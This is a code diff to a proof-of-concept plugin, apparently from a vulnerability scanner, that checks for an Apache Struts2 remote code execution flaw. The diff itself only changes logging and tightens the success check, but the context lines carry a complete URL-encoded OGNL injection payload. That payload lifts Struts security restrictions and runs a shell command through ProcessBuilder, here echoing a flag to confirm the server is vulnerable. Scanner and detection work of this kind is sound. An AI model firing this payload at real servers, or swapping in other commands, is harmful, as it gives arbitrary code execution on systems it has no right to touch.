@@ -3,7 +3,7 @@
 '''
 Date: 2022-03-22 10:33:13
 LastEditors: recar
-LastEditTime: 2022-03-23 18:14:44
+LastEditTime: 2022-03-23 18:36:02
 '''
 
 from plugins.poc.base import PocBase
@@ -37,9 +37,8 @@ class Poc(PocBase):
         cmd = "echo "+self.flag
         payload = """%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27"""+cmd+"""%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D"""
         url = "{0}/{1}/{2}".format(self.base_url, payload, suffix)
-        self.logger.info(url)
+        self.logger.debug(url)
         response = self.request("GET", url, headers=headers, timeout=3, verify=False, allow_redirects=False)
-        if self.flag in response.text:
+        if self.flag in response.text and response.status_code == 200:
             return True, url
         return False, None
-
